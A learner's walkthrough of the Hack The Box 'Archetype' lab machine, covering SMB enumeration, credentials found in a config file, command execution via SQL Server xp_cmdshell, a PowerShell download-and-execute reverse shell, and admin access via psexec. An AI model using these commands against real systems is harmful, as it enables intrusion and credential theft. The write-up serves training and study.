# Archetype

This is a box at hackthebox.eu in their "starting point" zone.  This is a zone for entry-level boxes which are all, or mostly all, very easy. 


## Discovery

Archetype is a Windows box (it says so on the box listing) residing at 10.10.10.27 and so the first step is to do a basic nmap scan and see what we find.

### Starting with a Scan
Assuming we're connected to the starting point VPN (separate from the Lab VMs), we run:
```
$ nmap -sS -sV -sC -Pn -top-ports 1000 -oN 10.10.10.27.normal.nmap

Nmap scan report for 10.10.10.27
Host is up (0.014s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-07-18T14:21:45
|_Not valid after:  2051-07-18T14:21:45
|_ssl-date: 2021-07-19T13:09:10+00:00; +24m00s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h48m00s, deviation: 3h07m51s, median: 23m59s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-19T06:09:03-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-19T13:09:02
|_  start_date: N/A
```

From this we notice a few somewhat interesting things.  First, we see this box is exposing MSRPC on 135, as well as both Samba (netbios TCP/139 + active directory TCP/445) and SQL server (TCP/1433). 

Some other bits and bobs nmap scripts pull out include the machine name (ARCHETYPE), the exact OS name (Windows Server 2019 SP 17763 / standard 6.3), and the workgroup (WORKGROUP).

We can also see that the system supports users without message signing, and we used a guest session.

### Probing Samba

Let's re-run our nmap command with the ports we're interested in and this time specify a broader range of smb-enum scripts:

```
└─$ nmap -script=smb-enum-* -v -p 135,139,445 10.10.10.27
... and after a minute or so ...

Scanning 10.10.10.27 [3 ports]
Discovered open port 139/tcp on 10.10.10.27
Discovered open port 135/tcp on 10.10.10.27
Discovered open port 445/tcp on 10.10.10.27
Completed Connect Scan at 18:31, 0.01s elapsed (3 total ports)
NSE: Script scanning 10.10.10.27.
Initiating NSE at 18:31
Completed NSE at 18:32, 36.87s elapsed
Nmap scan report for 10.10.10.27
Host is up (0.016s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-sessions: 
|   Users logged in
|_    ARCHETYPE\sql_svc since <unknown>
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.27\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.27\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.27\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.27\backups: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: READ
|_    Current user access: READ

NSE: Script Post-scanning.
Initiating NSE at 18:32
Completed NSE at 18:32, 0.00s elapsed

```

So now we see there's a user on the system called `ARCHETYPE\sql_svc` as well as several file shares.  We have read/write access to `IPC$` as well as read access to `backups`, so let's mount them and see what we can see...

### Mounting SMB Shares

First, let's verify we can list the shares.  From the docs for `smbclient` we see:
```
...
       -L|--list
           This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host
           names or if you are trying to reach a host on another network.
...
       -N|--no-pass
           If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password.
           Unless a password is specified on the command line or this parameter is specified, the client will request a password.
           If a password is specified on the command line and this option is also defined the password on the command line will be silently ignored and no password will be used.
```

Since we know guest accounts are available, let's try and list the shares without a password:

```
└─$ smbclient -N -L \\\\10.10.10.27\\

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

Note that `\\\\10.10.10.27\\` translates to `\\10.10.10.27\` which is the format that Samba expects (i.e. UNC paths: https://www.pcmag.com/encyclopedia/term/unc)

Let's take a look inside these shares.  We already know we have access only to IPC$ and backups so let's mount them both and take a look inside:

```
└─$ smbclient -N \\\\10.10.10.27\\IPC$   
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_INVALID_INFO_CLASS listing \*

...

└─$ smbclient -N \\\\10.10.10.27\\backups
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
```

Now we see that `IPC$` is empty and `backups` contains `prod.dtsConfig` so let's grab that down and take a peak.

```
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (9.9 KiloBytes/sec) (average 9.9 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>          
```

Looks like we have some SQL credentials: `User ID=ARCHETYPE\sql_svc` and `Password=M3g4c0rp123` -- jackpot :)  Let's try and connect to the database...

## Getting a Foothold

Trying to connec to the database with those credentials initially yields a little trouble:

```
└─$ mssqlclient.py "ARCHETYPE/sql_svc@10.10.10.27"                                                                                                                                                                                     127 ⨯
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'sql_svc'.
```

But there's an extra flag for mssqlclient.py that we should use: `-windows-auth` -- trying that:

```
└─$ mssqlclient.py "ARCHETYPE/sql_svc@10.10.10.27" -windows-auth
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> enable_xp_cmdshell
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  
```

Now we have a shell!  Let's upgrade our shell...

### Upgrading our Shell with a Reverse Shell

First we're going to host up a server which will have our "shellcode":

```
┌──(kali㉿kali)-[~/htb/utils/shells]
└─$ python3 -m http.server 80                                                                                                                                                                                                            1 ⨯
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

and let's spin up a netcat listener (Remember to allow it through your firewall -- you want incoming connections from 10.10.10.27 to be able to talk to the port):

```
└─$ nc -nlvp 443                          
listening on [any] 443 ...
```

and finally download and execute our reverse shell on Archetype:

```
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.47/shell.ps1\");""
```

You should see netcat respond:
```

└─$ nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.27] 49773

```

and from here you can issue commands.

Some problems you may run into:

1. If the SQL prompt stops giving you any output when you run a command, exit out of it with ctrl-c and then reconnect and try again
2. If you're seeing errors about "&" then you're probably messing up the quotes
3. If your HTTP server isn't printing out that you're receiving requests for shell.ps1 then your firewall is probably in the way
4. IF you're getting errors about Null-valued expressions, you probably need to run `nc -nlvp 443`
5. If you don't have a shell.ps1 file, search the internet for a reverse shell in PowerShell or write your own

A good first line for a PowerShell reverse shell is:
```
$client=New-Object System.Net.Sockets.TCPClient("your.vpn.ip.addr",443);
...
```

### Finding the user.txt flag

This is as simple as navigating to the Desktop and printing out the flag:
```
# cd ~
# ls


    Directory: C:\Users\sql_svc


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        1/20/2020   5:01 AM                3D Objects                                                            
d-r---        1/20/2020   5:01 AM                Contacts                                                              
d-r---        1/20/2020   5:42 AM                Desktop                                                               
d-r---        1/20/2020   5:01 AM                Documents                                                             
d-r---        1/20/2020   5:01 AM                Downloads                                                             
d-r---        1/20/2020   5:01 AM                Favorites                                                             
d-r---        1/20/2020   5:01 AM                Links                                                                 
d-r---        1/20/2020   5:01 AM                Music                                                                 
d-r---        1/20/2020   5:01 AM                Pictures                                                              
d-r---        1/20/2020   5:01 AM                Saved Games                                                           
d-r---        1/20/2020   5:01 AM                Searches                                                              
d-r---        1/20/2020   5:01 AM                Videos            

# cd Desktop
# ls


    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2020   6:37 AM             32 user.txt                                                              


# cat user.txt
...
```

## Privilege Escalation

A good first place to look for privilege escalation on Windows is the powershell history.  This file exists at:

```
# cd ~/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine
# ls


    Directory: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        3/17/2020   2:36 AM             79 ConsoleHost_history.txt                                               


# cat ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

So from the history file, we can see that the user switched to admin to mount the backups file, and typed their password into the command.

We can now use Impacket's psexec.py to connect to the server as admin:

```
└─$ psexec.py administrator@10.10.10.27
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file tQRiLVIo.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service zBUM on 10.10.10.27.....
[*] Starting service zBUM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> ls
s


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2020   6:36 AM             32 root.txt                                                              


PS C:\Users\Administrator\Desktop> cat root.txt
```

## Summary

This box is rated "Very Easy" -- please note that I used the writeup to find this information out.  I'm writing my own write-up so I retain this information.  Just because a box is very easy, doesn't mean it can't teach us things.

What I've learned from this box:

1. enum4linux doesn't always find things that nmap scripts can find!
2. You can log into windows samba shares without usernames or passwords sometimes!
3. Impacket's default tools in Kali might not be up-to-date nor complete and you should download the source and install them yourself to get things like mssqlclient.py
4. How to mount Samba shares
5. SQL Server has a freaking XP cmdshell built into it?
6. PowerShell (and some .NET Core scripting in the process) to fix up the reverse shell I found in the original write-up that didn't copy over corectly.
7. More about where Windows keeps goodies in the directory tree
8. psexec.py is a thing that lets you run commands on a remote windows box with user credentials (from a Linux machine)

HTH~

